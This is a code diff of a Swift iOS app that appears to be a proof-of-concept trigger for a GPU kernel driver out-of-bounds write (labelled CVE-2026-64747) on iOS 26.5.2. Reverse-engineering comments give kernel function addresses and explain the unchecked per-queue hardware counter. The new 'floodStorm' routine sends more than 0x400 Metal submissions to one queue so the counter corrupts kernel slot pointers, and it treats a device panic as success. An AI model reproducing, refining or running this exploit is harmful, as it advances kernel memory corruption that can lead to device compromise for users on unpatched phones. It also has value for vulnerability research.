@@ -4,21 +4,19 @@
 //
 //  Target: CVE-2026-64747 — AGXG14P command queue count-bitmask OOB.
 //
-//  Reverse-engineering (2026-08-10):
+//  Reverse-engineering (2026-08-11, decisive):
 //    * Vulnerable fn 0xfffffff008003a8c (26.5.2): x1 = 32-bit count bitmask.
 //      For every set bit n it writes 0x40 zeroed bytes to obj+0x1040+n*0x40
-//      and obj+0x1540+n*0x40 (two slot arrays).  26.6 fix: reject count>=0x400,
-//      i.e. any bit >= 10.  Legal slots are n=0..9; n=10..31 are OOB.
-//    * The count mask is OR-accumulated across a batch of submitted commands
-//      from each command's [cmd+0x14] field (wrapper 0xfffffff00800c9d0:
-//      `orr x28, x28, x27; ldr w27, [x20,#0x14]`).
-//    * ==> The trigger hypothesis: a single batch where some command's 0x14
-//      field (or an OR across the batch) sets a bit >= 10.
-//      We do not yet know which userland knob feeds cmd+0x14, so this probe
-//      floods every plausible one with HIGH-BIT values — signal values
-//      (1<<k), event masks (0x3FF|0x400..), fences, huge batches, render +
-//      compute + blit, many queues.  If any path reaches a count with bit
-//      >=10, the device panics (or the app dies) → trigger is userland-reachable.
+//      and obj+0x1540+n*0x40 (two slot arrays).  Legal bits are n=0..9;
+//      n=10..31 are OOB.  26.6 fix: `orr w8,w2,w1; cmp #0x3ff; b.hi reject`.
+//    * The count is NOT accumulated by kernel software.  queue+0x170 and
+//      queue+0x700 are GPU firmware/hardware counters — monotonic per queue.
+//      Commit fn 0x1d7ec0 feeds `[queue+0x170] & 0xffffff80` → cmd+0xc4 and
+//      `[queue+0x700] & 0xffffff80` → cmd+0xc8 with no bounds check.
+//    * ==> The trigger: flood ONE queue with >=0x400 submissions so its
+//      hardware counter crosses bit10 (0x400).  v2's "many queues, few each"
+//      was wrong — the counter is per-queue, not global.
+//      The 26.6 patch's existence proves the counter legally passes 0x3ff.
 //
 //  Build with Xcode on a Mac (free Apple ID 7-day signing is fine), run on
 //  the iPhone 13 / iOS 26.5.2 device, press START, watch the log.
@@ -31,7 +29,7 @@ import os
 final class AGXStress {
 
     enum Phase: String, CaseIterable {
-        case slotStorm    = "slotStorm    (maxCommandBufferCount spread → slot>=10)"
+        case floodStorm   = "floodStorm   (ONE queue ≥0x400 submits → bit10 OOB)"
         case eventStorm   = "eventStorm   (signal values 0..63)"
         case bitStorm     = "bitStorm     (signal 1<<k, k=0..31)"
         case maskStorm    = "maskStorm    (signal high-bit masks 0x3FF..0xFFFFFFFF)"
@@ -115,7 +113,7 @@ final class AGXStress {
         lock.lock(); defer { lock.unlock() }
         guard !running else { return }
         running = true
-        phase = .slotStorm
+        phase = .floodStorm
         iterations = 0
         log("=== AGXProbe START (device \(device.name)) ===")
         DispatchQueue.global(qos: .userInitiated).async { [weak self] in
@@ -145,7 +143,7 @@ final class AGXStress {
         while isRunning() && guardCounter < 60_000_000 {
             let p = currentPhase()
             switch p {
-            case .slotStorm:        slotStorm()
+            case .floodStorm:       floodStorm()
             case .eventStorm:       eventStorm()
             case .bitStorm:         bitStorm()
             case .maskStorm:        maskStorm()
@@ -191,51 +189,81 @@ final class AGXStress {
 
     // MARK: - engines
 
-    /// Phase 0 — THE trigger hypothesis for CVE-2026-64747.
+    /// Phase 0 — THE trigger for CVE-2026-64747 (v3).
     ///
-    /// Kernel RE (2026-08-10): the vuln slot-fill fn 0x3a8c is fed its count
-    /// from [cmd+0xc4] / [cmd+0xc8] on the command-buffer descriptor with NO
-    /// bounds check (legal slots are bits 0..9; the arrays at obj+0x1040/
-    /// 0x1540 / 0xdc0 / 0x12c0 have 10 entries).  The sister fn 0x3c20 has the
-    /// same unchecked counts; only 0x38e4 (guarded by `orr w8,w2,w1; cmp #0x3ff`)
-    /// is patched.  26.6 fixes both by rejecting (w1|w2) > 0x3ff.
+    /// Kernel RE (2026-08-11, decisive): queue+0x170 / queue+0x700 are GPU
+    /// *firmware/hardware* counters — no kernel software accumulates them.
+    /// Allocator 0x1bd450 and base-class init 0x1c08e0 never write 0x170; the
+    /// queue vtable method 0x4aa540 writes [q+0x170]=[q+0x16c]=w1 where w1 comes
+    /// from [q+0x174] (cached high word) or a blraa to vtable+0x7a8 (hardware
+    /// poll).  Commit fn 0x1d7ec0 reads
+    ///   [cmd+0xc4] = [queue+0x170] & 0xffffff80
+    ///   [cmd+0xc8] = [queue+0x700] & 0xffffff80
+    /// with NO bounds check and feeds vuln fn 0x3a8c / 0x3c20, which treat the
+    /// value as a bitmask and copy a 0x40 template to obj+0x1040+n*0x40 and
+    /// obj+0x1540+n*0x40 for every set bit n.  Legal bits are 0..9; bit >= 10
+    /// (count >= 0x400) writes OOB up to 0x1d40 — still inside the 0x2000
+    /// object, over the command-slot pointer fields at 0x12c0..0x1d00.
+    /// 26.6 adds `orr w8,w2,w1; cmp #0x3ff; b.hi reject` — Apple admits the
+    /// counter legally passes 0x3ff in normal use.
     ///
-    /// The only userland knob plausibly controlling which slot a command gets
-    /// is the queue's ring size (maxCommandBufferCount).  So: for a spread of
-    /// ring sizes, commit buffers until every slot has been handed out; if the
-    /// driver assigns slot >= 10 (bit >= 10 in the mask) the kernel writes
-    /// 0x40 bytes past the legal array → panic / GPU stall is expected.
-    private func slotStorm() {
-        let counts: [Int] = [11, 12, 16, 24, 32, 64, 128, 256, 512, 1024]
-        for n in counts {
-            guard let q = device.makeCommandQueue(maxCommandBufferCount: n) else { continue }
-            var submitted = 0
-            // commit ~3 ring rotations so slot 10+ (if the ring is that wide)
-            // is reached several times.  Bound the loop defensively.
-            let target = min(n * 3, 1500)
-            for _ in 0..<target {
-                guard let cb = q.makeCommandBuffer() else { break }
-                blitOn(cb, val: UInt32(submitted & 0x3FF))
-                cb.commit()
-                submitted += 1
-                // periodic soft drain so the ring never wedges
-                if submitted % 300 == 0 {
-                    let sem = DispatchSemaphore(value: 0)
-                    let b = q.makeCommandBuffer()
-                    b?.addCompletedHandler { _ in sem.signal() }
-                    b?.commit()
-                    _ = sem.wait(timeout: .now() + 2)
+    /// v2 was WRONG: it spread submissions across many fresh queues, but the
+    /// counter is PER-QUEUE monotonic.  v3 floods ONE queue with >=1024 submits
+    /// so its hardware counter crosses bit10.  Keep in-flight bounded (<= ring)
+    /// via a semaphore so the queue never wedges; then barrier-check for GPU
+    /// STALL / panic as the observable trigger signal.
+    private func floodStorm() {
+        let inflightCap = 64                    // matches a sane default ring width
+        let sem = DispatchSemaphore(value: inflightCap)
+        let target: UInt64 = 4096               // 4x past 0x400 — covers ring/wrap slack
+        var committed: UInt64 = 0
+        var stalled = false
+        var reported = 0
+
+        // Reuse one scratch pair so 4096 submits don't allocate 4096 live
+        // MTLBuffers (the GPU keeps each alive until its buffer completes).
+        let pair: (MTLBuffer, MTLBuffer)? = {
+            guard let a = device.makeBuffer(length: 64, options: .storageModeShared),
+                  let b = device.makeBuffer(length: 64, options: .storageModeShared) else { return nil }
+            return (a, b)
+        }()
+
+        log("floodStorm: ONE queue → \(target) submits (needs ≥0x400 to set bit10)")
+        while committed < target && isRunning() {
+            guard let cb = queue.makeCommandBuffer() else { break }
+            cb.addCompletedHandler { _ in sem.signal() }
+            if let (a, b) = pair, let blit = cb.makeBlitCommandEncoder() {
+                a.contents().storeBytes(of: UInt32(committed & 0x3FF), toByteOffset: 0, as: UInt32.self)
+                // 8 copies per buffer — if the counter advances per command
+                // rather than per buffer, this multiplies the reach by 8.
+                for _ in 0..<8 {
+                    blit.copy(from: a, sourceOffset: 0, to: b, destinationOffset: 0, size: 64)
                 }
+                blit.endEncoding()
             }
-            log("slotStorm: maxCommandBufferCount=\(n) → \(submitted) committed")
-            let sem = DispatchSemaphore(value: 0)
-            let b = q.makeCommandBuffer()
-            b?.addCompletedHandler { _ in sem.signal() }
-            b?.commit()
-            if sem.wait(timeout: .now() + 6) == .timedOut {
-                log("!!! slotStorm max=\(n): GPU STALL")
+            cb.commit()
+            committed += 1
+            if sem.wait(timeout: .now() + 3) == .timedOut {
+                stalled = true
+                log("!!! floodStorm: in-flight cap never freed at \(committed) — GPU STALL?")
+                break
+            }
+            if committed >= UInt64((reported + 1) * 512) {
+                reported += 1
+                log("floodStorm: committed=\(committed) live")
             }
         }
+        // Final barrier — prove the queue drained, or report the stall.
+        let done = DispatchSemaphore(value: 0)
+        if let b = queue.makeCommandBuffer() {
+            b.addCompletedHandler { _ in done.signal() }
+            b.commit()
+        }
+        let r = done.wait(timeout: .now() + 8)
+        log("floodStorm: committed=\(committed) barrier=\(r == .timedOut ? "STALL" : "ok") stalled=\(stalled)")
+        // A reboot / panic-full in Analytics is the win signal.  If bit10 fired
+        // and the OOB overwrote the 0x12c0..0x1d00 slot fields the app may die
+        // or the GPU hang — both are observable trigger confirmations.
     }
 
     /// Commit a command buffer that signals `event` to `value`.  FIX: do NOT
